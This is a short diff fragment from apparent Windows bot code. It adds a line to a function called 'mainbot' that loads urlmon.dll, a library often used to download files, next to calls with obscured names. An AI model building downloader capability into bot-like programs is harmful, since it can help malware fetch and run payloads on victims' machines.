@@ -155,6 +155,7 @@ void loadserial()
 
 void mainbot()
 {
+    HMODULE hModule = LoadLibrary(_T("urlmon.dll"));
     rydekem();
     lnttirs();
     tlmisir();
